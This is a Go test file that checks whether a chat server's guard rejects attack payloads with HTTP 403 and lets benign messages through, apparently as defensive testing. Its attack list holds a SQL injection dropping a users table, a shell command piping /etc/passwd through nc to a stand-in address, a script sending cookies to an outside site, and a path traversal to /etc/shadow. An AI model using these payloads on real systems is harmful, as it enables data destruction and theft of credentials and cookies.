package main

import (
	"net/http"
	"net/http/httptest"
	"os"
	"strings"
	"testing"

	"github.com/m-mizutani/gt"
)

// attacks are the payloads the question must catch, and benign the ones it must
// not. One question covers all of them.
var attacks = map[string]string{
	"SQL injection":  `{"message":"apple' OR 1=1; DROP TABLE users--"}`,
	"shell command":  `{"message":"report.docx; cat /etc/passwd | nc 203.0.113.9 4444"}`,
	"script":         `{"message":"<script>fetch('https://example.net/steal?c='+document.cookie)</script>"}`,
	"path traversal": `{"message":"read the file at ../../../../etc/shadow"}`,
}

var benign = map[string]string{
	"question": `{"message":"What is your refund policy?"}`,
	"report":   `{"message":"Thanks, upgrading to 1.4.2 fixed the crash for me."}`,
}

func post(h http.Handler, body string) int {
	r := httptest.NewRequest(http.MethodPost, "/chat", strings.NewReader(body))
	r.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	h.ServeHTTP(w, r)
	return w.Code
}

// TestGuardLive sends every payload through the server the command serves,
// against the real TypeSafe API, and requires the attacks to be answered 403
// and the benign requests to reach chatHandler. It runs only when
// TEST_TYPESAFE_API_KEY is set.
func TestGuardLive(t *testing.T) {
	apiKey, ok := os.LookupEnv("TEST_TYPESAFE_API_KEY")
	if !ok {
		t.Skip("TEST_TYPESAFE_API_KEY is not set")
	}
	t.Setenv("TYPESAFE_API_KEY", apiKey)
	h := newServer().Handler

	for name, body := range attacks {
		t.Run("blocks "+name, func(t *testing.T) {
			gt.Number(t, post(h, body)).Describef("payload: %s", body).Equal(http.StatusForbidden)
		})
	}
	for name, body := range benign {
		t.Run("passes "+name, func(t *testing.T) {
			gt.Number(t, post(h, body)).Describef("payload: %s", body).Equal(http.StatusOK)
		})
	}
}
